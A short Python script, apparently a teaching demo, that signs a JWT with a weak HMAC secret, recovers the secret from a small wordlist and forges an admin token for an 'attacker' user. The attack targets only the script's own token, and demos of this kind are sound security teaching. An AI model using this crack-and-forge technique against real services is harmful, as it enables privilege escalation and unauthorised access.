import jwt
import itertools
# Step 1: Create a token with weak secret
secret = "secret123"
payload = {"user": "aditya", "role": "user"}
token = jwt.encode(payload, secret, algorithm="HS256")
print("[+] Legit Token:", token)
# Step 2: Brute force secret
wordlist = ["123456", "password", "secret", "secret123", "admin"]
cracked_secret = None
for word in wordlist:
 try:
 decoded = jwt.decode(token, word, algorithms=["HS256"])
 cracked_secret = word
 print(f"[+] Cracked Secret: {word}")
 break
 except jwt.InvalidSignatureError:
 continue
# Step 3: Forge admin token
if cracked_secret:
 forged_payload = {"user": "attacker", "role": "admin"}
 forged_token = jwt.encode(forged_payload, cracked_secret, algorithm="HS256")
 print("[+] Forged Admin Token:", forged_token)
else:
 print("[-] Could not crack secret!")
